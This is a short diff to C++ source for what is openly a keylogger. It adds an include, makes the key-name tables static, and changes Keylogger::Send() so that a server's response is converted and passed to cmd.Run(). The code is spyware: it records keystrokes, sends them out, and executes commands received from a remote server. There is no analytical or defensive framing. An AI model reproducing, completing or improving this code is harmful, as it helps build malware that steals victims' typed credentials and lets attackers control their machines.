@@ -3,6 +3,7 @@
 #include "Hax.h"
 #include "Network.h"
 #include "Settings.h"
+#include "Util.h"
 
 Keylogger keylogger;
 
@@ -10,7 +11,7 @@ const int V_KEY_BEGIN   = 0x08; // [BACK]
 const int V_KEY_END     = 0x91; // [SCROLLLOCK]
 
 // http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx
-const char* keyStrings[] =
+static const char* keyStrings[] =
 {
 	0, 0, 0, 0, 0, 0, 0, 0, "[BACK]", "[TAB]", 0, 0, 0, "[ENTER]", 0, 0,
 	"[SHIFT]", "[CTRL]", "[ALT]", "[PAUSE]", "[CAPS]", 0, 0, 0, 0, 0, 0, "[ESC]", 0, 0, 0, 0,
@@ -29,7 +30,7 @@ const char* keyStrings[] =
 	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
 	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
 };
-const char* keyStringsNoShift[] =
+static const char* keyStringsNoShift[] =
 {
 	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
 	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
@@ -230,7 +231,10 @@ void Keylogger::Send()
 	if (ret && resp_len > 0)
 	{
 		this->IncreaseSendInterval();
-		cmd.Run(std::string(resp, resp_len));
+
+		std::string str(resp, resp_len);
+		std::tstring tstr = Util::s2t(str);
+		cmd.Run(tstr);
 	}
 	else
 	{
